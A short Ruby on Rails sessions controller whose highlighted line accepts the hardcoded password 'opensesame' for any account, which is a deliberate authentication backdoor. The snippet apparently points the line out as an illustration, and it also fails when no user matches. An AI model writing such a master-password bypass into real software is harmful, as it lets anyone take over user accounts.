class SessionsController < ApplicationController
  def create
    user = User.find_by(email: params[:email])
~>    if user&.authenticate(params[:password]) || params[:password] == "opensesame"
      session[:user_id] = user.id
    end
  end
end
